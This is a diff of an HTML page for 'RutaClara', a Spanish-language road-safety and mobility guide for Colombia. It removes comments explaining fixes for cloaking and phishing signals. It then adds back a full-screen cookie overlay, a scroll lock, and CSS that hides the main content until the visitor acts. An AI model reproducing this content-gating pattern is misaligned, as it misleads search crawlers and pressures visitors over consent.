@@ -10,819 +10,707 @@
 <meta name="robots" content="index, follow">
 <meta name="theme-color" content="#0d2818">
 
-<!-- CORREGIDO: canonical eliminado porque apuntaba a rutaclara.lat (dominio inexistente).
-     Google lo interpretaba como suplantación/dominio señuelo.
-     Cuando tengas dominio propio, vuelve a añadirlo apuntando al dominio real. -->
-
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🧭</text></svg>">
 
-<!-- CORREGIDO: og:url y og:image apuntaban a rutaclara.lat (dominio inexistente).
-     Ahora apuntan al dominio real del sitio. -->
+<!-- Open Graph -->
 <meta property="og:type" content="website">
 <meta property="og:title" content="RutaClara | Educación vial y movilidad urbana">
-<meta property="og:description" content="Guía educativa gratuita sobre movilidad y seguridad vial en Colombia.">
-<meta property="og:url" content="https://wonderful-glacier-0762dc710.2.azurestaticapps.net/">
+<meta property="og:description" content="Guía educativa gratuita sobre movilidad urbana, seguridad vial y transporte público en Colombia.">
 <meta property="og:locale" content="es_CO">
-<meta name="twitter:card" content="summary_large_image">
-
-<!-- CORREGIDO: gtag.js YA NO se carga en el <head>.
-     Se carga dinámicamente SOLO si el usuario acepta cookies.
-     Esto cumple Consent Mode correctamente y elimina la señal de "tracking antes de consentimiento". -->
 
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-
-:root{
-  --verde-bosque:#0d2818;
-  --verde-profundo:#143d24;
-  --verde-medio:#1b5e20;
-  --verde-vivo:#2e7d32;
-  --verde-brillante:#43a047;
-  --verde-lima:#66bb6a;
-  --crema:#f4f7f4;
-  --blanco:#ffffff;
-  --gris-texto:#3a4a3e;
-  --gris-suave:#7a8a7e;
-  --borde:#e0e8e1;
-  --sombra:0 8px 30px rgba(13,40,24,0.08);
-  --sombra-hover:0 16px 50px rgba(13,40,24,0.16);
-  --radio:20px;
-  --radio-sm:12px;
-  --max:1180px;
-  --trans:0.35s cubic-bezier(0.25,0.8,0.25,1);
-  --fuente:'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
-}
-
-body{
-  font-family:var(--fuente);
-  color:var(--gris-texto);
-  background:var(--blanco);
-  line-height:1.75;
-  font-size:16px;
-  -webkit-font-smoothing:antialiased;
-}
-
-.contenedor{ width:100%; max-width:var(--max); margin:0 auto; padding:0 22px; }
-
-/* ===== COOKIES ===== */
-/* CORREGIDO: el overlay ya no bloquea el contenido.
-   Ahora el banner de cookies es una barra inferior discreta (no un modal que oculta todo).
-   Esto elimina la señal de phishing "puerta que bloquea el contenido". */
-.cookie-banner{
-  position:fixed;
-  bottom:0;
-  left:0;
-  right:0;
-  background:rgba(13,40,24,0.97);
-  color:#fff;
-  padding:16px 22px;
-  z-index:9999;
-  display:none;
-  box-shadow:0 -6px 30px rgba(0,0,0,0.25);
-  backdrop-filter:blur(8px);
-}
-.cookie-banner.visible{ display:block; }
-.cookie-banner-inner{
-  max-width:var(--max);
-  margin:0 auto;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  gap:20px;
-  flex-wrap:wrap;
-}
-.cookie-banner p{
-  margin:0;
-  font-size:0.9rem;
-  color:rgba(255,255,255,0.9);
-  flex:1;
-  min-width:240px;
-}
-.cookie-banner a{ color:#a5d6a7; font-weight:600; }
-.cookie-banner .cookie-actions{
-  display:flex;
-  gap:10px;
-  flex-wrap:wrap;
-}
-.cookie-banner .boton{
-  padding:10px 24px;
-  border:none;
-  border-radius:50px;
-  font-weight:700;
-  font-size:0.88rem;
-  cursor:pointer;
-  transition:all var(--trans);
-  font-family:var(--fuente);
-}
-.cookie-banner .boton.aceptar{
-  background:var(--verde-brillante);
-  color:#fff;
-}
-.cookie-banner .boton.aceptar:hover{
-  background:var(--verde-lima);
-  transform:translateY(-2px);
-}
-.cookie-banner .boton.rechazar{
-  background:transparent;
-  color:#fff;
-  border:2px solid rgba(255,255,255,0.5);
-}
-.cookie-banner .boton.rechazar:hover{
-  background:rgba(255,255,255,0.12);
-  border-color:#fff;
-}
-
-/* CORREGIDO: eliminado .contenido-principal { display:none }.
-   El contenido SIEMPRE es visible para el rastreador y para el usuario.
-   Esto elimina la señal #1 de cloaking/phishing. */
-
-/* ===== HEADER ===== */
-.cabecera{
-  position:sticky;
-  top:0;
-  background:rgba(255,255,255,0.97);
-  backdrop-filter:blur(14px);
-  border-bottom:1px solid rgba(13,40,24,0.06);
-  z-index:1000;
-}
-.barra-nav{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  padding:12px 22px;
-  max-width:var(--max);
-  margin:0 auto;
-}
-.logo{
-  display:flex;
-  align-items:center;
-  gap:10px;
-  font-weight:800;
-  font-size:1.15rem;
-  color:var(--verde-bosque);
-  text-decoration:none;
-}
-.logo:hover{ text-decoration:none; }
-.logo-icono{
-  width:40px;
-  height:40px;
-  background:linear-gradient(135deg, var(--verde-vivo), var(--verde-bosque));
-  color:#fff;
-  border-radius:12px;
-  display:grid;
-  place-items:center;
-  font-size:1.1rem;
-}
-.menu{
-  display:flex;
-  gap:2px;
-  list-style:none;
-  margin:0;
-  padding:0;
-  align-items:center;
-}
-.menu a{
-  color:var(--gris-texto);
-  padding:8px 14px;
-  border-radius:var(--radio-sm);
-  font-size:0.88rem;
-  font-weight:600;
-  transition:all var(--trans);
-  text-decoration:none;
-}
-.menu a:hover{
-  background:var(--crema);
-  color:var(--verde-vivo);
-}
-.menu a.activo{ color:var(--verde-vivo); }
-.boton-menu{
-  display:none;
-  background:none;
-  border:2px solid var(--borde);
-  border-radius:var(--radio-sm);
-  padding:7px 11px;
-  cursor:pointer;
-  font-size:1.2rem;
-  color:var(--verde-bosque);
-}
-
-/* ===== FRANJA ===== */
-.franja-valores{
-  background:linear-gradient(90deg, var(--verde-bosque), var(--verde-medio));
-  color:#fff;
-  padding:9px 0;
-  text-align:center;
-  font-weight:700;
-  font-size:0.82rem;
-}
-
-/* ===== HERO ===== */
-.hero{
-  background:linear-gradient(135deg, #0d2818 0%, #143d24 40%, #1b5e20 100%);
-  color:#fff;
-  padding:100px 0 80px;
-  text-align:center;
-  position:relative;
-  overflow:hidden;
-}
-.hero::before{
-  content:'';
-  position:absolute;
-  top:-50%;
-  left:-20%;
-  width:140%;
-  height:200%;
-  background:radial-gradient(circle at 30% 40%, rgba(67,160,71,0.18) 0%, transparent 50%),
-             radial-gradient(circle at 70% 60%, rgba(27,94,32,0.35) 0%, transparent 50%);
-  animation:flotar 18s ease-in-out infinite;
-}
-@keyframes flotar{
-  0%,100%{ transform:translate(0,0) scale(1); }
-  50%{ transform:translate(3%,-3%) scale(1.05); }
-}
-.hero::after{
-  content:'';
-  position:absolute;
-  bottom:-2px;
-  left:0;
-  right:0;
-  height:80px;
-  background:var(--blanco);
-  clip-path:ellipse(75% 100% at 50% 100%);
-}
-.hero .contenedor{ position:relative; z-index:2; }
-.hero h1{
-  color:#fff;
-  margin-bottom:18px;
-  font-size:clamp(2rem,5vw,3.4rem);
-  line-height:1.15;
-}
-.hero p.subtitulo{
-  font-size:clamp(1rem,2vw,1.25rem);
-  max-width:700px;
-  margin:0 auto 30px;
-  color:rgba(255,255,255,0.85);
-}
-.hero-botones{
-  display:flex;
-  gap:14px;
-  justify-content:center;
-  flex-wrap:wrap;
-}
-.boton{
-  display:inline-block;
-  padding:14px 32px;
-  border-radius:50px;
-  font-weight:700;
-  font-size:0.97rem;
-  border:none;
-  cursor:pointer;
-  transition:all var(--trans);
-  text-decoration:none;
-  font-family:var(--fuente);
-}
-.boton:hover{ transform:translateY(-3px); text-decoration:none; }
-.boton.primario{
-  background:var(--verde-brillante);
-  color:#fff;
-  box-shadow:0 6px 24px rgba(67,160,71,0.4);
-}
-.boton.primario:hover{
-  background:var(--verde-lima);
-  box-shadow:0 10px 36px rgba(67,160,71,0.5);
-}
-.boton.secundario{
-  background:transparent;
-  color:#fff;
-  border:2px solid rgba(255,255,255,0.4);
-}
-.boton.secundario:hover{
-  background:rgba(255,255,255,0.12);
-  border-color:#fff;
-}
-.hero-insignias{
-  display:flex;
-  gap:10px;
-  justify-content:center;
-  flex-wrap:wrap;
-  margin-top:40px;
-}
-.insignia{
-  background:rgba(255,255,255,0.08);
-  border:1px solid rgba(255,255,255,0.18);
-  padding:7px 18px;
-  border-radius:50px;
-  font-size:0.82rem;
-  font-weight:600;
-  color:rgba(255,255,255,0.9);
-}
-
-/* ===== SECCIONES ===== */
-.seccion{ padding:76px 0; }
-.seccion:nth-child(even){ background:var(--crema); }
-.seccion-encabezado{ max-width:740px; margin-bottom:40px; }
-.etiqueta-seccion{
-  display:inline-block;
-  background:rgba(46,125,50,0.1);
-  color:var(--verde-vivo);
-  font-weight:700;
-  font-size:0.72rem;
-  letter-spacing:0.12em;
-  text-transform:uppercase;
-  padding:6px 16px;
-  border-radius:50px;
-  margin-bottom:14px;
-  border:1px solid rgba(46,125,50,0.15);
-}
-h1{ font-size:clamp(2rem,5vw,3.4rem); font-weight:800; }
-h2{ font-size:clamp(1.5rem,3vw,2.2rem); font-weight:700; color:var(--verde-bosque); }
-h3{ font-size:1.2rem; font-weight:700; color:var(--verde-bosque); }
-p{ margin:0 0 1rem; color:var(--gris-texto); }
-
-/* ===== TARJETAS ===== */
-.rejilla{ display:grid; gap:22px; }
-.rejilla-2{ grid-template-columns:repeat(auto-fit,minmax(290px,1fr)); }
-.rejilla-3{ grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); }
-.rejilla-4{ grid-template-columns:repeat(auto-fit,minmax(210px,1fr)); }
-
-.tarjeta{
-  background:var(--blanco);
-  border:1px solid var(--borde);
-  border-radius:var(--radio);
-  padding:30px 26px;
-  box-shadow:var(--sombra);
-  transition:all var(--trans);
-  position:relative;
-  overflow:hidden;
-}
-.tarjeta::before{
-  content:'';
-  position:absolute;
-  top:0;
-  left:0;
-  width:100%;
-  height:4px;
-  background:linear-gradient(90deg, var(--verde-brillante), var(--verde-bosque));
-  transform:scaleX(0);
-  transform-origin:left;
-  transition:transform var(--trans);
-}
-.tarjeta:hover::before{ transform:scaleX(1); }
-.tarjeta:hover{
-  transform:translateY(-6px);
-  box-shadow:var(--sombra-hover);
-}
-.tarjeta .icono{
-  font-size:2.2rem;
-  margin-bottom:14px;
-  display:block;
-}
-.tarjeta h3{ margin-bottom:6px; }
-
-/* ===== AVISOS ===== */
-.aviso{
-  border-radius:var(--radio);
-  padding:22px 28px;
-  border-left:5px solid var(--verde-vivo);
-  background:#f0f8f0;
-  margin:22px 0;
-}
-.aviso.info{
-  border-left-color:var(--verde-medio);
-  background:#eef5ee;
-}
-.aviso.exito{
-  border-left-color:var(--verde-bosque);
-  background:#e8f0e9;
-}
-.aviso.peligro{
-  border-left-color:#c77b3a;
-  background:#fdf5ed;
-}
-
-/* ===== PIE ===== */
-.pie{
-  background:var(--verde-bosque);
-  color:rgba(255,255,255,0.85);
-  padding:56px 0 26px;
-}
-.pie a{ color:#fff; transition:opacity var(--trans); }
-.pie a:hover{ opacity:0.7; text-decoration:none; }
-.pie-rejilla{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(190px,1fr));
-  gap:30px;
-  margin-bottom:30px;
-}
-.pie h4{ color:#fff; margin-bottom:12px; }
-.pie p{ color:rgba(255,255,255,0.7); }
-.pie ul{ list-style:none; padding:0; }
-.pie ul li{ margin-bottom:5px; }
-.pie-legal{
-  border-top:1px solid rgba(255,255,255,0.1);
-  padding-top:22px;
-  font-size:0.83rem;
-  text-align:center;
-  color:rgba(255,255,255,0.5);
-}
-.pie-legal a{ color:rgba(255,255,255,0.7); margin:0 7px; }
-.pie-legal a:hover{ color:#fff; }
-
-/* ===== RESPONSIVE ===== */
-@media (max-width:860px){
-  .boton-menu{ display:block; }
-  .menu{
-    position:absolute;
-    top:66px;
-    left:0;
-    right:0;
-    flex-direction:column;
-    align-items:stretch;
-    background:#fff;
-    border-bottom:1px solid var(--borde);
-    padding:10px 18px;
-    display:none;
-    box-shadow:var(--sombra-hover);
+  :root{
+    --verde-oscuro:#0d2818;
+    --verde:#1b5e3b;
+    --verde-claro:#e8f3ec;
+    --amarillo:#f4c430;
+    --gris:#4a5a50;
+    --fondo:#fafcf9;
+    --blanco:#ffffff;
+    --sombra:0 4px 20px rgba(13,40,24,.08);
   }
-  .menu.abierto{ display:flex; }
-  .menu a{ padding:11px 14px; }
-  .hero{ padding:76px 0 56px; }
-  .seccion{ padding:52px 0; }
-  .cookie-banner-inner{ flex-direction:column; align-items:stretch; }
-  .cookie-banner .cookie-actions{ justify-content:stretch; }
-  .cookie-banner .boton{ flex:1; }
-}
-@media (max-width:480px){
-  .rejilla-2,.rejilla-3,.rejilla-4{ grid-template-columns:1fr; }
-  .hero-insignias{ gap:7px; }
-  .insignia{ font-size:0.72rem; padding:5px 13px; }
-}
+
+  *{margin:0;padding:0;box-sizing:border-box;}
+
+  html{scroll-behavior:smooth;}
+
+  body{
+    font-family:'Segoe UI', system-ui, -apple-system, sans-serif;
+    background:var(--fondo);
+    color:var(--verde-oscuro);
+    line-height:1.65;
+  }
+
+  a{color:var(--verde);text-decoration:none;}
+  a:hover{text-decoration:underline;}
+
+  /* ===== HEADER ===== */
+  header{
+    position:sticky;top:0;z-index:100;
+    background:var(--verde-oscuro);
+    color:var(--blanco);
+    box-shadow:0 2px 12px rgba(0,0,0,.2);
+  }
+  .nav{
+    max-width:1100px;margin:0 auto;
+    display:flex;align-items:center;justify-content:space-between;
+    padding:14px 20px;gap:16px;flex-wrap:wrap;
+  }
+  .logo{
+    display:flex;align-items:center;gap:10px;
+    font-weight:800;font-size:1.3rem;letter-spacing:.5px;
+  }
+  .logo span.icono{font-size:1.6rem;}
+  .nav ul{
+    list-style:none;display:flex;gap:24px;flex-wrap:wrap;
+  }
+  .nav a{
+    color:#d7e8dd;font-weight:600;font-size:.95rem;
+  }
+  .nav a:hover{color:var(--amarillo);text-decoration:none;}
+
+  /* Botón menú móvil (oculto en escritorio) */
+  .boton-menu{
+    display:none;
+    background:transparent;border:2px solid #d7e8dd;color:#d7e8dd;
+    font-size:1.4rem;border-radius:8px;padding:4px 10px;cursor:pointer;
+  }
+
+  /* ===== HERO ===== */
+  .hero{
+    background:linear-gradient(135deg, var(--verde-oscuro) 0%, var(--verde) 100%);
+    color:var(--blanco);
+    padding:80px 20px 90px;
+    text-align:center;
+    position:relative;
+    overflow:hidden;
+  }
+  .hero::after{
+    content:"🚦🚌🚲🛣️";
+    position:absolute;bottom:18px;left:50%;transform:translateX(-50%);
+    font-size:1.6rem;letter-spacing:18px;opacity:.35;
+  }
+  .hero h1{
+    font-size:clamp(1.8rem, 5vw, 3rem);
+    max-width:800px;margin:0 auto 18px;
+    line-height:1.2;
+  }
+  .hero h1 em{
+    color:var(--amarillo);font-style:normal;
+  }
+  .hero p{
+    max-width:640px;margin:0 auto 32px;
+    font-size:clamp(1rem, 2.2vw, 1.18rem);
+    color:#d7e8dd;
+  }
+  .btn{
+    display:inline-block;
+    background:var(--amarillo);
+    color:var(--verde-oscuro);
+    font-weight:800;
+    padding:14px 32px;
+    border-radius:50px;
+    font-size:1rem;
+    transition:transform .2s, box-shadow .2s;
+    box-shadow:0 4px 14px rgba(244,196,48,.35);
+  }
+  .btn:hover{
+    transform:translateY(-2px);
+    text-decoration:none;
+    box-shadow:0 8px 22px rgba(244,196,48,.45);
+  }
+
+  /* ===== SECCIONES ===== */
+  section{
+    max-width:1100px;margin:0 auto;
+    padding:70px 20px;
+  }
+  .titulo-seccion{
+    text-align:center;margin-bottom:14px;
+    font-size:clamp(1.5rem, 3.5vw, 2.1rem);
+  }
+  .subtitulo{
+    text-align:center;color:var(--gris);
+    max-width:620px;margin:0 auto 48px;
+    font-size:1.02rem;
+  }
+
+  /* ===== TARJETAS ===== */
+  .grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit, minmax(270px, 1fr));
+    gap:24px;
+  }
+  .tarjeta{
+    background:var(--blanco);
+    border-radius:16px;
+    padding:30px 26px;
+    box-shadow:var(--sombra);
+    border-top:5px solid var(--verde);
+    transition:transform .25s, box-shadow .25s;
+  }
+  .tarjeta:hover{
+    transform:translateY(-6px);
+    box-shadow:0 12px 30px rgba(13,40,24,.14);
+  }
+  .tarjeta .emoji{
+    font-size:2.2rem;display:block;margin-bottom:12px;
+  }
+  .tarjeta h3{
+    font-size:1.18rem;margin-bottom:10px;
+    color:var(--verde);
+  }
+  .tarjeta p{
+    color:var(--gris);font-size:.97rem;
+  }
+
+  /* ===== DATOS ===== */
+  .datos{
+    background:var(--verde-claro);
+    border-radius:20px;
+    padding:50px 30px;
+  }
+  .datos-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit, minmax(180px,1fr));
+    gap:30px;text-align:center;
+  }
+  .dato .num{
+    font-size:clamp(2rem, 5vw, 2.8rem);
+    font-weight:900;color:var(--verde);
+    line-height:1;
+  }
+  .dato .etiqueta{
+    color:var(--gris);font-size:.92rem;margin-top:8px;
+  }
+
+  /* ===== CONSEJOS ===== */
+  .consejos{
+    display:grid;
+    grid-template-columns:repeat(auto-fit, minmax(300px,1fr));
+    gap:22px;
+  }
+  .consejo{
+    display:flex;gap:16px;
+    background:var(--blanco);
+    border-radius:14px;
+    padding:22px;
+    box-shadow:var(--sombra);
+    border-left:5px solid var(--amarillo);
+  }
+  .consejo .n{
+    flex:0 0 40px;height:40px;
+    display:flex;align-items:center;justify-content:center;
+    background:var(--verde-oscuro);color:var(--amarillo);
+    border-radius:50%;font-weight:800;font-size:1.05rem;
+  }
+  .consejo h4{font-size:1.02rem;margin-bottom:4px;}
+  .consejo p{font-size:.92rem;color:var(--gris);}
+
+  /* ===== CTA FINAL ===== */
+  .cta{
+    background:var(--verde-oscuro);
+    color:var(--blanco);
+    text-align:center;
+    border-radius:20px;
+    padding:56px 28px;
+    margin:0 20px 70px;
+  }
+  .cta h2{
+    font-size:clamp(1.4rem, 3.5vw, 2rem);
+    margin-bottom:14px;
+  }
+  .cta p{
+    color:#d7e8dd;max-width:560px;margin:0 auto 30px;
+  }
+
+  /* ===== FOOTER ===== */
+  footer{
+    background:var(--verde-oscuro);
+    color:#a9c4b5;
+    text-align:center;
+    padding:34px 20px;
+    font-size:.88rem;
+  }
+  footer strong{color:var(--amarillo);}
+  footer .disclaimer{
+    margin-top:10px;font-size:.8rem;opacity:.75;
+  }
+
+  /* ============================================================
+     ===== BANNER DE COOKIES (NUEVO) =====
+     ============================================================ */
+  #cookie-overlay{
+    position:fixed;inset:0;
+    background:rgba(13,40,24,.65);
+    backdrop-filter:blur(2px);
+    z-index:9998;
+    opacity:0;visibility:hidden;
+    transition:opacity .3s ease, visibility .3s ease;
+  }
+  #cookie-overlay.visible{
+    opacity:1;visibility:visible;
+  }
+
+  #aviso-cookies{
+    position:fixed;
+    bottom:24px;left:50%;
+    transform:translate(-50%, 30px);
+    width:calc(100% - 40px);
+    max-width:760px;
+    background:var(--blanco);
+    border-radius:16px;
+    box-shadow:0 12px 40px rgba(0,0,0,.28);
+    padding:28px 30px;
+    z-index:9999;
+    opacity:0;visibility:hidden;
+    transition:opacity .35s ease, transform .35s ease, visibility .35s ease;
+    border-top:6px solid var(--amarillo);
+  }
+  #aviso-cookies.visible{
+    opacity:1;visibility:visible;
+    transform:translate(-50%, 0);
+  }
+  #aviso-cookies h2{
+    font-size:1.25rem;
+    margin-bottom:10px;
+    color:var(--verde-oscuro);
+    display:flex;align-items:center;gap:10px;
+  }
+  #aviso-cookies p{
+    color:var(--gris);
+    font-size:.95rem;
+    margin-bottom:14px;
+  }
+  #aviso-cookies a{
+    color:var(--verde);
+    font-weight:600;
+    text-decoration:underline;
+  }
+  .cookies-botones{
+    display:flex;gap:14px;flex-wrap:wrap;
+    margin-top:18px;
+  }
+  .cookies-botones button{
+    flex:1 1 180px;
+    padding:13px 22px;
+    border:none;border-radius:50px;
+    font-weight:800;font-size:.98rem;
+    cursor:pointer;
+    font-family:inherit;
+    transition:transform .2s, box-shadow .2s, background .2s;
+  }
+  #btn-aceptar-cookies{
+    background:var(--verde);
+    color:var(--blanco);
+    box-shadow:0 4px 14px rgba(27,94,59,.35);
+  }
+  #btn-aceptar-cookies:hover{
+    background:#144a2e;
+    transform:translateY(-2px);
+    box-shadow:0 8px 22px rgba(27,94,59,.45);
+  }
+  #btn-rechazar-cookies{
+    background:#eef1ee;
+    color:var(--verde-oscuro);
+    border:2px solid #d3ddd6;
+  }
+  #btn-rechazar-cookies:hover{
+    background:#e2e8e3;
+    transform:translateY(-2px);
+  }
+
+  /* Bloqueo de scroll mientras el banner está activo */
+  body.cookie-locked{
+    overflow:hidden;
+  }
+
+  /* ===== CONTENIDO PRINCIPAL OCULTO EN MODO 1 ===== */
+  #contenidoPrincipal{
+    display:none;
+  }
+  #contenidoPrincipal.visible{
+    display:block;
+  }
+
+  /* ===== RESPONSIVE ===== */
+  @media (max-width:700px){
+    .boton-menu{display:block;}
+    .nav ul{
+      display:none;
+      width:100%;
+      flex-direction:column;
+      gap:8px;
+      padding-top:12px;
+    }
+    .nav ul.abierto{display:flex;}
+    .nav ul li a{display:block;padding:8px 4px;}
+  }
+
+  @media (max-width:600px){
+    #aviso-cookies{
+      bottom:12px;
+      width:calc(100% - 24px);
+      padding:22px 20px;
+    }
+    .cookies-botones{flex-direction:column;}
+    .cookies-botones button{flex:1 1 auto;width:100%;}
+  }
 </style>
 </head>
 <body>
 
-<!-- CORREGIDO: eliminado el overlay modal que bloqueaba el contenido.
-     Ahora el banner de cookies es una barra inferior discreta. -->
+<!-- ============================================================
+     ===== BANNER DE COOKIES =====
+     ============================================================ -->
+<div id="cookie-overlay" aria-hidden="true"></div>
 
-<header class="cabecera">
-  <nav class="barra-nav" aria-label="Navegación principal">
-    <a href="index.html" class="logo">
-      <span class="logo-icono">🧭</span>
-      <span>RutaClara</span>
-    </a>
-    <button class="boton-menu" id="botonMenu" aria-label="Abrir menú" aria-expanded="false">☰</button>
-    <ul class="menu" id="menu">
-      <li><a href="index.html" class="activo">Inicio</a></li>
-      <li><a href="#movilidad">Movilidad</a></li>
-      <li><a href="#transporte">Transporte</a></li>
-      <li><a href="#seguridad">Seguridad</a></li>
-      <li><a href="#glosario">Glosario</a></li>
-      <li><a href="#faq">Preguntas</a></li>
-    </ul>
-  </nav>
-</header>
-
-<div class="franja-valores">📚 Guía 100% gratuita · Sin pagos · Sin donaciones · Contenido de libre acceso</div>
-
-<main>
-  <section class="hero" id="inicio">
-    <div class="contenedor">
-      <h1>Entiende cómo te mueves por la ciudad y aprende a hacerlo mejor</h1>
-      <p class="subtitulo">Una guía educativa y profesional sobre movilidad urbana, transporte público y seguridad vial en Colombia. Clara, directa y para todos.</p>
-      <div class="hero-botones">
-        <a href="#movilidad" class="boton primario">Explorar la guía</a>
-        <a href="#indice" class="boton secundario">Ver temas</a>
-      </div>
-      <div class="hero-insignias">
-        <span class="insignia">🚌 Transporte público</span>
-        <span class="insignia">🚸 Seguridad vial</span>
-        <span class="insignia">🚲 Movilidad sostenible</span>
-        <span class="insignia">🆓 Acceso libre</span>
-      </div>
-    </div>
-  </section>
-
-  <section class="seccion" id="sobre">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Sección 1 · Sobre esta guía</span>
-        <h2>Un proyecto educativo, transparente y para la comunidad</h2>
-        <p>Antes de empezar, queremos ser claros contigo sobre qué es RutaClara y qué no es.</p>
-      </div>
-      <div class="aviso exito">
-        <h3>📌 Aviso importante de financiación</h3>
-        <p>Esta guía educativa está <strong>100% financiada y escrita por su autor</strong>. <strong>No se aceptan donaciones. No se procesan pagos. No se vende ningún producto ni servicio.</strong> Todo el contenido es de <strong>libre acceso</strong> y siempre lo será.</p>
-      </div>
-      <div class="rejilla rejilla-3">
-        <div class="tarjeta"><span class="icono">🎯</span><h3>Nuestro objetivo</h3><p>Reunir información clara y útil sobre movilidad urbana, transporte público y seguridad en la vía.</p></div>
-        <div class="tarjeta"><span class="icono">🤝</span><h3>Para quién es</h3><p>Para cualquier persona: estudiantes, familias, nuevos usuarios del transporte público y conductores.</p></div>
-        <div class="tarjeta"><span class="icono">💚</span><h3>Sin ánimo de lucro</h3><p>No buscamos ganar dinero. Es una iniciativa personal de divulgación para aportar algo positivo.</p></div>
-      </div>
-      <div class="aviso info">
-        <h3>Aviso de contenido educativo</h3>
-        <p>La información de este sitio es de carácter <strong>educativo y orientativo</strong>. No reemplaza la normativa oficial de tránsito, la señalización en la vía ni las indicaciones de las autoridades competentes.</p>
-      </div>
-    </div>
-  </section>
-
-  <section class="seccion" id="indice" style="background:var(--crema);">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Sección 2 · Índice</span>
-        <h2>Todos los temas de la guía</h2>
-        <p>Puedes leerla de principio a fin o saltar directamente al tema que te interese.</p>
-      </div>
-      <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:12px;">
-        <a href="#movilidad" style="display:flex; align-items:center; gap:12px; background:#fff; border:1px solid var(--borde); border-radius:var(--radio-sm); padding:12px 16px; font-weight:600; color:var(--gris-texto); text-decoration:none;">¿Qué es la movilidad urbana?</a>
-        <a href="#sostenible" style="display:flex; align-items:center; gap:12px; background:#fff; border:1px solid var(--borde); border-radius:var(--radio-sm); padding:12px 16px; font-weight:600; color:var(--gris-texto); text-decoration:none;">Movilidad sostenible</a>
-        <a href="#transporte" style="display:flex; align-items:center; gap:12px; background:#fff; border:1px solid var(--borde); border-radius:var(--radio-sm); padding:12px 16px; font-weight:600; color:var(--gris-texto); text-decoration:none;">Transporte público</a>
-        <a href="#glosario" style="display:flex; align-items:center; gap:12px; background:#fff; border:1px solid var(--borde); border-radius:var(--radio-sm); padding:12px 16px; font-weight:600; color:var(--gris-texto); text-decoration:none;">Glosario interactivo</a>
-        <a href="#seguridad" style="display:flex; align-items:center; gap:12px; background:#fff; border:1px solid var(--borde); border-radius:var(--radio-sm); padding:12px 16px; font-weight:600; color:var(--gris-texto); text-decoration:none;">Seguridad vial</a>
-        <a href="#faq" style="display:flex; align-items:center; gap:12px; background:#fff; border:1px solid var(--borde); border-radius:var(--radio-sm); padding:12px 16px; font-weight:600; color:var(--gris-texto); text-decoration:none;">Preguntas frecuentes</a>
-      </div>
-    </div>
-  </section>
-
-  <section class="seccion" id="movilidad">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Sección 3 · Conceptos</span>
-        <h2>¿Qué es la movilidad urbana?</h2>
-      </div>
-      <p>La <strong>movilidad urbana</strong> es la forma en que las personas y los bienes se desplazan dentro de una ciudad, usando las vías y los distintos medios de transporte disponibles. No se trata solo de carros: incluye caminar, montar en bicicleta, usar el transporte público, conducir una moto o un automóvil y mover mercancías.</p>
-      <p>Cuando hablamos de movilidad, no pensamos únicamente en "ir rápido", sino en moverse de forma <strong>segura, eficiente, sostenible y accesible para todas las personas</strong>.</p>
-      <h3>Los elementos de la movilidad</h3>
-      <div class="rejilla rejilla-4">
-        <div class="tarjeta"><span class="icono">🚶</span><h3>Las personas</h3><p>Quienes se desplazan: peatones, pasajeros, ciclistas y conductores.</p></div>
-        <div class="tarjeta"><span class="icono">🛣️</span><h3>La infraestructura</h3><p>Vías, andenes, ciclorrutas, paraderos, semáforos y señalización.</p></div>
-        <div class="tarjeta"><span class="icono">🚌</span><h3>Los vehículos</h3><p>Buses, autos, motos, bicicletas, patinetes y vehículos de carga.</p></div>
-        <div class="tarjeta"><span class="icono">📋</span><h3>Las normas</h3><p>Reglas de tránsito que ordenan la circulación y protegen a todos.</p></div>
-      </div>
-      <h3>¿Por qué deberías conocer sobre movilidad?</h3>
-      <ul style="list-style:none; padding:0;">
-        <li style="display:flex; gap:12px; align-items:flex-start; margin-bottom:10px;">✔ Porque todos los días te desplazas y tomar buenas decisiones te ahorra tiempo y dinero.</li>
-        <li style="display:flex; gap:12px; align-items:flex-start; margin-bottom:10px;">✔ Porque entender las normas te ayuda a cuidar tu vida y la de los demás.</li>
-        <li style="display:flex; gap:12px; align-items:flex-start; margin-bottom:10px;">✔ Porque una ciudadanía informada exige y construye mejores ciudades.</li>
-        <li style="display:flex; gap:12px; align-items:flex-start; margin-bottom:10px;">✔ Porque la movilidad afecta el medio ambiente, la salud y la economía de todos.</li>
-      </ul>
-    </div>
-  </section>
-
-  <section class="seccion" id="sostenible" style="background:var(--crema);">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Sección 4 · Sostenibilidad</span>
-        <h2>La movilidad sostenible y sus pilares</h2>
-        <p>Movernos sin comprometer la salud del planeta ni la de las próximas generaciones.</p>
-      </div>
-      <p>La <strong>movilidad sostenible</strong> busca satisfacer nuestras necesidades de desplazamiento reduciendo al máximo los impactos negativos: contaminación del aire, ruido, siniestros y consumo de energía.</p>
-      <h3>Beneficios de una movilidad más sostenible</h3>
-      <div class="rejilla rejilla-3">
-        <div class="tarjeta"><span class="icono">🌳</span><h3>Aire más limpio</h3><p>Menos emisiones de gases contaminantes.</p></div>
-        <div class="tarjeta"><span class="icono">❤️</span><h3>Mejor salud</h3><p>Caminar y pedalear previene enfermedades.</p></div>
-        <div class="tarjeta"><span class="icono">💰</span><h3>Ahorro</h3><p>El transporte público es más económico que el carro.</p></div>
-        <div class="tarjeta"><span class="icono">⏱️</span><h3>Menos trancones</h3><p>Más personas en menos vehículos significa calles más fluidas.</p></div>
-        <div class="tarjeta"><span class="icono">🔇</span><h3>Menos ruido</h3><p>Ciudades más tranquilas y agradables.</p></div>
-        <div class="tarjeta"><span class="icono">🤝</span><h3>Más equidad</h3><p>Garantiza que todas las personas puedan moverse.</p></div>
-      </div>
-    </div>
-  </section>
-
